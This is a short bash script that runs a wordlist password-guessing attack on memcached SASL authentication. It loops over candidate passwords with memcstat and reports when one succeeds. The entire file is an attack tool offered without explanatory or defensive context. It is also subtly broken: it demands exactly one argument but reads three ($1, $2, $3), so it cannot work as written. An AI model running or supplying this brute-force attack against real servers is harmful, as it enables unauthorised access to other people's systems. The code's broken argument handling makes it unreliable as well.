#! /bin/bash

if [[ $# -ne 1 ]]; then
    echo "Missing parameters"
    exit 2
fi

while read wordlist ; do
echo "Trying $wordlist"
    if memcstat --servers=$1 --username=$2 --password=$wordlist | grep -q Server ; then
    echo "Password Found: "$wordlist
    break
fi
done < $3
